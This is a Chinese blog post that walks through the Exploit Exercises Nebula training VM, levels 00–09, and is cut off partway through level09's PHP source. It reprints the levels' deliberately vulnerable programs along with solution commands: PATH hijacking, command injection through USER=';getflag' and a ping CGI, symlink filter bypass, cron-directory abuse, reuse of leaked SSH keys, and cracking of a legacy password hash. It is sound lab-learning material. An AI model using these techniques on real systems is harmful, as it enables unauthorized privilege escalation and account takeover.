<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<meta name="author" content="lzp">



<meta name="description" content="本实验获取flag的标志是  You have successfully executed getflag on a target account  通用的getshell是123456789101112131415161718#include &amp;lt;stdlib.h&amp;gt;  #include &amp;lt;unistd.h&amp;gt;  #include &amp;lt;sys/types.h&amp;gt;  #i">
<meta name="keywords" content="Exploit Exercises,WP">
<meta property="og:type" content="article">
<meta property="og:title" content="liunx练习">
<meta property="og:url" content="http://yoursite.com/2018/11/28/liunx练习/index.html">
<meta property="og:site_name" content="lzp&#39;s blogs">
<meta property="og:description" content="本实验获取flag的标志是  You have successfully executed getflag on a target account  通用的getshell是123456789101112131415161718#include &amp;lt;stdlib.h&amp;gt;  #include &amp;lt;unistd.h&amp;gt;  #include &amp;lt;sys/types.h&amp;gt;  #i">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2018-11-28T09:01:12.185Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="liunx练习">
<meta name="twitter:description" content="本实验获取flag的标志是  You have successfully executed getflag on a target account  通用的getshell是123456789101112131415161718#include &amp;lt;stdlib.h&amp;gt;  #include &amp;lt;unistd.h&amp;gt;  #include &amp;lt;sys/types.h&amp;gt;  #i">

<link rel="apple-touch-icon" href="/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="lzp&#39;s blogs" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.png">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>liunx练习 | lzp&#39;s blogs</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">lzp</a></h1>
        </hgroup>

        
        <p class="header-subtitle">仰望大哥，脚踩屌丝，大佬在哪</p>
        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false">
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
        


        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa GitHub" href="https://github.com/lzppp" title="GitHub"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">lzp</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">lzp</a></h1>
            </hgroup>
            
            <p class="header-subtitle">仰望大哥，脚踩屌丝，大佬在哪</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/lzppp" title="GitHub"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
</nav>
      <div class="body-wrap"><article id="post-liunx练习" class="article article-type-post" itemscope="" itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/11/28/liunx练习/" class="article-date">
      <time datetime="2018-11-28T08:59:04.000Z" itemprop="datePublished">2018-11-28</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      liunx练习
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit-Exercises/">Exploit Exercises</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WP/">WP</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>本实验获取flag的标志是</p>
<blockquote>
<p>You have successfully executed getflag on a target account</p>
</blockquote>
<p>通用的getshell是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;  </span><br><span class="line">#include &lt;unistd.h&gt;  </span><br><span class="line">#include &lt;sys/types.h&gt;  </span><br><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">  </span><br><span class="line">int main(int argc, char **argv, char **envp)  </span><br><span class="line">&#123;  </span><br><span class="line">  gid_t gid;  </span><br><span class="line">  uid_t uid;  </span><br><span class="line">  </span><br><span class="line">  gid = getegid();  </span><br><span class="line">  uid = geteuid();  </span><br><span class="line">  </span><br><span class="line">  setresgid(gid, gid, gid);  </span><br><span class="line">  setresuid(uid, uid, uid);  </span><br><span class="line">  </span><br><span class="line">  system(&quot;/bin/bash&quot;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里我们可以简化成system(“/bin/getflag”);</p>
<h2 id="level00"><a href="#level00" class="headerlink" title="level00"></a>level00</h2><h3 id="About"><a href="#About" class="headerlink" title="About"></a>About</h3><p> This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.<br> Alternatively, look at the find man page.<br> To access this level, log in as level00 with the password of level00.z</p>
<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>很明显这是个学习find命令的作业</p>
<ul>
<li><code>find / -name &quot;*set*id&quot;</code>#查找名字为set Id的文件 </li>
<li><code>find / -group cat</code># 查找在系统中属于 groupcat的文件</li>
<li><code>find / -amin -10</code> # 查找在系统中最后10分钟访问的文件</li>
<li><code>find / -atime -2</code> # 查找在系统中最后48小时访问的文件</li>
<li><code>find / -empty</code> # 查找在系统中为空的文件或者文件夹</li>
<li><code>find / -mmin -5</code> # 查找在系统中最后5分钟里修改过的文件</li>
<li><code>find / -mtime -1</code> #查找在系统中最后24小时里修改过的文件</li>
<li><code>find / -nouser</code> #查找在系统中属于作废用户的文件</li>
<li><code>find / -user fred</code> #查找在系统中属于FRED这个用户的文件</li>
<li><code>find / -maxdepth 2</code>#用于限制查找层数</li>
<li><code>find / -size +1g</code> #用于限制查找大小</li>
<li><code>find / -perm 755</code>#用于限制权限</li>
<li><ul>
<li>-perm mode:文件许可正好符合mode</li>
</ul>
</li>
<li><ul>
<li>-perm +mode:文件许可部分符合mode</li>
</ul>
</li>
<li><ul>
<li>-perm -mode: 文件许可完全符合mode</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>命令find . -type f -perm +6000就是指定目录下所有具有suid/sgid的程序</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><code>find / -perm +0 -user flag00 2&gt;/dev/null</code>获取第一个文件 <strong>/bin/…/flag00</strong>就执行可以了</p>
<hr>
<h2 id="level01"><a href="#level01" class="headerlink" title="level01"></a>level01</h2><h3 id="About-1"><a href="#About-1" class="headerlink" title="About"></a>About</h3><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?<br>To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.  </p>
<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv, char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  gid_t gid;</span><br><span class="line">  uid_t uid;</span><br><span class="line">  gid = getegid();</span><br><span class="line">  uid = geteuid();</span><br><span class="line"></span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">  system(&quot;/usr/bin/env echo and now what?&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h3><p>运行<code>/home/flag01/flag01</code>输出<code>and now what?</code><br>flag01这里调用了echo命令<br>用<code>/bin/bash</code>我们代替echo<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -e &apos;#/bin/bash\r\n/bin/bash&apos; &gt; /tmp/echo</span><br><span class="line">chmod +x /tmp/echo</span><br><span class="line">/home/flag01/flag01</span><br></pre></td></tr></table></figure></p>
<p>==没有弄明白==</p>
<h2 id="level02"><a href="#level02" class="headerlink" title="level02"></a>level02</h2><h3 id="About-2"><a href="#About-2" class="headerlink" title="About"></a>About</h3><p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?<br>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>
<h3 id="Source-1"><a href="#Source-1" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv, char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *buffer;</span><br><span class="line"></span><br><span class="line">  gid_t gid;</span><br><span class="line">  uid_t uid;</span><br><span class="line"></span><br><span class="line">  gid = getegid();</span><br><span class="line">  uid = geteuid();</span><br><span class="line"></span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  setresuid(uid, uid, uid);</span><br><span class="line"></span><br><span class="line">  buffer = NULL;</span><br><span class="line"></span><br><span class="line">  asprintf(&amp;buffer, &quot;/bin/echo %s is cool&quot;, getenv(&quot;USER&quot;));</span><br><span class="line">  printf(&quot;about to call system(\&quot;%s\&quot;)\n&quot;, buffer);</span><br><span class="line">  </span><br><span class="line">  system(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h3><p>运行<code>/home/flag02/flag02</code>得到输出</p>
<blockquote>
<p>about to call system(“/bin/echo level02 is cool”)<br>level02 is cool   </p>
</blockquote>
<p>看源码，获取了环境变量user。<br>验证下输入命令<code>env</code>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">TERM=xterm</span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">SSH_CLIENT=192.168.2.1 5024 22</span><br><span class="line">SSH_TTY=/dev/pts/1</span><br><span class="line">USER=level02</span><br><span class="line">LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:</span><br><span class="line">MAIL=/var/mail/level02</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</span><br><span class="line">PWD=/home/level02</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">SHLVL=1</span><br><span class="line">HOME=/home/level02</span><br><span class="line">LANGUAGE=en_US:</span><br><span class="line">LOGNAME=level02</span><br><span class="line">SSH_CONNECTION=192.168.2.1 5024 192.168.2.3 22</span><br><span class="line">LESSOPEN=| /usr/bin/lesspipe %s</span><br><span class="line">LESSCLOSE=/usr/bin/lesspipe %s %s</span><br><span class="line">_=/usr/bin/env</span><br></pre></td></tr></table></figure></p>
<p>更改环境变量为<code>USER=&quot;;getflag&quot;</code>就得到flag</p>
<h2 id="level03"><a href="#level03" class="headerlink" title="level03"></a>level03</h2><h3 id="About-3"><a href="#About-3" class="headerlink" title="About"></a>About</h3><p>Check the home directory of flag03 and take note of the files there.<br>There is a crontab that is called every couple of minutes.<br>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p>
<h3 id="WP-3"><a href="#WP-3" class="headerlink" title="WP"></a>WP</h3><p>flag03中有个定时任务，我们看看这个定时任务 <strong>writable.sh</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">for i in /home/flag03/writable.d/* ; do</span><br><span class="line">	(ulimit -t 5; bash -x &quot;$i&quot;)</span><br><span class="line">	rm -f &quot;$i&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>
<ul>
<li><code>ulimit -t 5</code>是限制CPU使用时间的</li>
<li><code>bash -x &quot;$i&quot;</code>是运行文件i</li>
</ul>
<p><code>echo &quot;getflag &gt; /tmp/flag&quot; &gt; /home/flag03/writable.d/run</code>在/home/flag03/writable.d/中加入run<br>run的内容是运行getflag<br>过两分钟后看看/tmp/flag，得到flag</p>
<h2 id="level04"><a href="#level04" class="headerlink" title="level04"></a>level04</h2><h3 id="About-4"><a href="#About-4" class="headerlink" title="About"></a>About</h3><p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)<br>To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.</p>
<h3 id="Source-2"><a href="#Source-2" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv, char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[1024];</span><br><span class="line">  int fd, rc;</span><br><span class="line"></span><br><span class="line">  if(argc == 1) &#123;</span><br><span class="line">      printf(&quot;%s [file to read]\n&quot;, argv[0]);</span><br><span class="line">      exit(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if(strstr(argv[1], &quot;token&quot;) != NULL) &#123;</span><br><span class="line">      printf(&quot;You may not access &apos;%s&apos;\n&quot;, argv[1]);</span><br><span class="line">      exit(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fd = open(argv[1], O_RDONLY);</span><br><span class="line">  if(fd == -1) &#123;</span><br><span class="line">      err(EXIT_FAILURE, &quot;Unable to open %s&quot;, argv[1]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  rc = read(fd, buf, sizeof(buf));</span><br><span class="line">  </span><br><span class="line">  if(rc == -1) &#123;</span><br><span class="line">      err(EXIT_FAILURE, &quot;Unable to read fd %d&quot;, fd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  write(1, buf, rc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="WP-4"><a href="#WP-4" class="headerlink" title="WP"></a>WP</h3><p>flag04中包含flag04程序，和token，token是level04没有读取权限的，flag04有<br>我们尝试下flag04的作用<br><code>echo &quot;0&quot; &gt;/tmp/flag04;/home/flag04/flag04 /tmp/flag04</code><br>输出为0。flag04就是读取文件的。但是有个过滤，文件名不能含有token   <strong><code>if(strstr(argv[1], &quot;token&quot;) != NULL)</code></strong><br>那么我们<code>ln -s /home/flag04/token /tmp/flag04</code><br>接着运行<code>/home/flag04/flag04 /tmp/flag04</code> 结果就能输出token内容这个内容就是flag04的密码</p>
<h2 id="level05"><a href="#level05" class="headerlink" title="level05"></a>level05</h2><h3 id="About-5"><a href="#About-5" class="headerlink" title="About"></a>About</h3><p>Check the flag05 home directory. You are looking for weak directory permissions<br>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p>
<h3 id="WP-5"><a href="#WP-5" class="headerlink" title="WP"></a>WP</h3><p>在/home/flag05中仔细找找<code>ls -al</code>发现.backup文件夹，文件夹中有个压缩文件解压后发现这是ssh的密钥备份文件<br>把.ssh放到level05的用户目录，这样就有凭借这些密钥ssh免密码登录flag05账户了<br>ssh flag05@localhost 就可以了</p>
<h2 id="level06"><a href="#level06" class="headerlink" title="level06"></a>level06</h2><h3 id="About-6"><a href="#About-6" class="headerlink" title="About"></a>About</h3><p>The flag06 account credentials came from a legacy unix system.<br>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.</p>
<h3 id="WP-6"><a href="#WP-6" class="headerlink" title="WP"></a>WP</h3><p>flag06的是传统的UNIX的方式保存，密文存在/etc/passwd文件中。发行版的密码存在/etc/shadow中<br><code>cat /etc/passwd | grep flag06</code>可以得出</p>
<blockquote>
<p>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</p>
</blockquote>
<p>利用<a href="http://www.openwall.com/john/" target="_blank" rel="noopener">john</a>破解下就能得到密码了</p>
<h2 id="level07"><a href="#level07" class="headerlink" title="level07"></a>level07</h2><h3 id="About-7"><a href="#About-7" class="headerlink" title="About"></a>About</h3><p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.<br>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.</p>
<h3 id="Source-3"><a href="#Source-3" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/perl</span><br><span class="line"></span><br><span class="line">use CGI qw&#123;param&#125;;</span><br><span class="line"></span><br><span class="line">print &quot;Content-type: text/html\n\n&quot;;</span><br><span class="line"></span><br><span class="line">sub ping &#123;</span><br><span class="line">  $host = $_[0];</span><br><span class="line"></span><br><span class="line">  print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;);</span><br><span class="line"></span><br><span class="line">  @output = `ping -c 3 $host 2&gt;&amp;1`;</span><br><span class="line">  foreach $line (@output) &#123; print &quot;$line&quot;; &#125;</span><br><span class="line"></span><br><span class="line">  print(&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># check if Host set. if not, display normal page, etc</span><br><span class="line"></span><br><span class="line">ping(param(&quot;Host&quot;));</span><br></pre></td></tr></table></figure>
<h3 id="WP-7"><a href="#WP-7" class="headerlink" title="WP"></a>WP</h3><p>我没有在实体机打开<a href="http://192.168.2.1:7007/index.cgi?Host=127.0.0.1" target="_blank" rel="noopener">http://192.168.2.1:7007/index.cgi?Host=127.0.0.1</a><br>得到ping的内容,发现也可以本地运行<code>/home/flag07/flag07/index.cgi Host=127.0.0.1</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@output = `ping -c 3 $host 2&gt;&amp;1`</span><br></pre></td></tr></table></figure></p>
<p>这里包含典型的命令执行，我们是下<code>/home/flag07/flag07/index.cgi Host=127.0.0.1;whoami</code>后面多了<strong>level07</strong> 说明本地运行是level07用户跑的<br>写个html方便命令执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;test&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://192.168.2.3:7007/index.cgi&quot; method=&quot;get&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;Host&quot;/&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>在输入框输入<strong>127.0.0.1;whoami</strong><br>输出结果后面多了<strong>flag07</strong>证明我们成功命令执行了<br>把whoami改为getflag就行了</p>
<h2 id="level08"><a href="#level08" class="headerlink" title="level08"></a>level08</h2><h3 id="About-8"><a href="#About-8" class="headerlink" title="About"></a>About</h3><p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.<br>To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.</p>
<h3 id="WP-8"><a href="#WP-8" class="headerlink" title="WP"></a>WP</h3><p><code>strings capture.pcap | grep Pass</code>搜索包含String的字符得到</p>
<blockquote>
<p>Nf&amp;Nat</p>
</blockquote>
<p>看不懂还是拿出来直接wireShark分析吧<br>第一条流就得到</p>
<blockquote>
<p>Password: backdoor…00Rm8.ate</p>
</blockquote>
<p>查证得到<code>.</code>是删除的意思那么手动输入下得到密码</p>
<blockquote>
<p>backd00Rmate</p>
</blockquote>
<h2 id="level09"><a href="#level09" class="headerlink" title="level09"></a>level09</h2><h3 id="About-9"><a href="#About-9" class="headerlink" title="About"></a>About</h3><p>There’s a C setuid wrapper for some vulnerable PHP code…<br>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.</p>
<h3 id="Source-4"><a href="#Source-4" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function spam($email)</span><br><span class="line">&#123;</span><br><span class="line">  $email = preg_replace(&quot;/\./&quot;, &quot; dot &quot;, $email);</span><br><span class="line">  $email = preg_replace(&quot;/@/&quot;, &quot; AT &quot;, $email);</span><br><span class="line">  </span><br><span class="line">  return $email;</span><br><span 